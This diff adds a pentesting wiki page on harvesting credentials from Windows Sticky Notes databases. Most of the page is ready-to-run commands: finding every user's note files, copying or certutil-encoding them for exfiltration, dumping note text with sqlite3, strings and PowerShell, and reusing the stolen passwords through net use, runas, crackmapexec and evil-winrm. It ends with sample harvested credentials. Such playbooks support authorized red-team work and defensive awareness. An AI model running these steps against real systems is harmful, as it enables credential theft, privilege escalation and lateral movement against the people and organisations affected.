@@ -1,0 +1,193 @@
+---
+title: "StickyNotes"
+---
+
+# Sticky Notes (Credential Harvesting)
+
+The Windows Sticky Notes application stores user notes locally in a database file. Users frequently save credentials, VPN keys, server IPs and internal information inside notes.
+
+This makes it a valuable **post-exploitation and privilege escalation enumeration target**.
+
+---
+
+## File Locations
+
+### Windows 10 (1607+) & Windows 11
+
+```shellscript
+C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
+```
+
+Main database:
+
+```
+plum.sqlite
+```
+
+---
+
+### Windows 10 (1507 / 1511), Windows 8, Windows 7
+
+```shellscript
+C:\Users\%USERNAME%\AppData\Roaming\Microsoft\StickyNotes
+```
+
+Main file:
+
+```
+StickyNotes.snt
+```
+
+---
+
+## Why This Matters
+
+Users commonly store:
+
+- Domain credentials
+- RDP passwords
+- VPN credentials
+- Database credentials
+- API keys
+- Internal URLs
+- Administrator notes
+
+This often leads directly to **Privilege Escalation or Lateral Movement**.
+
+---
+
+## Quick Loot
+
+### Find all Sticky Notes files
+
+```powershell
+Get-ChildItem -Path C:\Users\ -Recurse -Include plum.sqlite,StickyNotes.snt -ErrorAction SilentlyContinue
+```
+
+---
+
+### From low privilege shell
+
+```cmd
+dir C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite /s
+dir C:\Users\*\AppData\Roaming\Microsoft\StickyNotes\StickyNotes.snt /s
+```
+
+---
+
+## Extract Data — Windows 10/11 (SQLite)
+
+### Copy file
+
+```cmd
+copy plum.sqlite C:\Windows\Temp\notes.db
+```
+
+or exfiltrate:
+
+```powershell
+certutil -encode plum.sqlite notes.txt
+```
+
+---
+
+### Read locally (attacker machine)
+
+```bash
+sqlite3 notes.db
+.tables
+SELECT Text FROM Note;
+```
+
+---
+
+### Quick dump
+
+```bash
+sqlite3 notes.db "SELECT Text FROM Note;"
+```
+
+---
+
+## Extract Data — Windows 7 / 8 / Early 10 (SNT)
+
+The `.snt` file is an OLE structured storage file.
+
+### Convert using strings
+
+```bash
+strings StickyNotes.snt
+```
+
+Often credentials appear in plaintext.
+
+---
+
+### Using oledump
+
+```bash
+oledump.py StickyNotes.snt
+```
+
+---
+
+## PowerShell Live Dump (no file copy)
+
+```powershell
+Add-Type -AssemblyName System.Data.SQLite
+$sql = "SELECT Text FROM Note"
+$db = "C:\Users\USER\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
+$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;")
+$conn.Open()
+$cmd = $conn.CreateCommand()
+$cmd.CommandText = $sql
+$reader = $cmd.ExecuteReader()
+while ($reader.Read()) { $reader["Text"] }
+$conn.Close()
+```
+
+---
+
+## Post Exploitation Use
+
+After obtaining credentials:
+
+### Test local admin reuse
+
+```cmd
+net use \\TARGET\C$ /user:Administrator PASSWORD
+```
+
+### RunAs
+
+```cmd
+runas /user:DOMAIN\admin cmd
+```
+
+### SMB Exec / WinRM
+
+```bash
+crackmapexec smb targets.txt -u user -p password
+evil-winrm -i target -u user -p password
+```
+
+---
+
+## Typical Findings
+
+Examples commonly discovered in engagements:
+
+```
+VPN: vpn.corp.local
+User: administrator
+Pass: Winter2024!
+
+DB:
+10.0.10.15
+root / P@ssw0rd!
+
+RDP Server:
+SRV-FILE01
+corp\backup-admin
+Backup123!
+```
